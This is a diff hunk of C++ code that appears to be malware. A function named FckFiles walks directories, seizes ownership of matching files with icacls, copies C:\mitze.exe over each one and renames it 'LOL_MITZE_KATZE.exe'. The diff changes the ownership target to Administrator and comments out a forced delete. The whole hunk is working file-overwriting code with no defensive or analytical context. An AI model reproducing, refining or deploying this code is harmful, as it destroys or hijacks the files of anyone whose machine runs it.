@@ -49,8 +49,8 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 				string Butter = "copy C:\\mitze.exe /Y "+ string(Chickfila);
 				const char* Sucker2 = Dutter.c_str();
 				const char* Sucker3 = Butter.c_str();
-				system(("icacls " + string(Chickfila) + " /setowner \""+username+"\" /T /C").c_str());
-				system(("del /f  "+ string(Chickfila)).c_str());
+				system(("icacls " + string(Chickfila) + " /setowner \""+"Administrator"+"\" /T /C").c_str());
+				//system(("del /f  "+ string(Chickfila)).c_str());
 				system(("copy C:\\mitze.exe /Y "+ string(Chickfila)).c_str());
 				rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
 			}
